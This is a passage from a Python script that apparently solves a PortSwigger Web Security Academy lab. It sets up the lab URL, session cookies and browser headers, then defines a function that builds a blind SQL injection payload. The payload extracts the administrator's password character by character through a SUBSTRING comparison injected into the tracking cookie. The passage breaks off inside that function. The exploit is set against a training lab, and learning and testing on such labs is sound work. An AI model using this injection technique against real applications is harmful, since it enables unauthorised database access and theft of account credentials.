...
burp0_url = "https://0acd00ae044bfe0e847f463100ec0098.web-security-academy.net:443/filter?category=Gifts"
burp0_cookies = {"TrackingId": "HnOnAvLI015yPRuT", "session": "kQr1xpIPjxVYtdwWfN9omT47LLbX8nVz"}
burp0_headers = {"Sec-Ch-Ua": "\"Not:A-Brand\";v=\"99\", \"Chromium\";v=\"112\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Linux\"", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0acd00ae044bfe0e847f463100ec0098.web-security-academy.net/filter?category=Gifts", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"}

def password_match(password: str):
    payload = f'\' AND \'{password}\'=SUBSTRING((SELECT password from users where username=\'administrator\'),1,{len(password)})--'
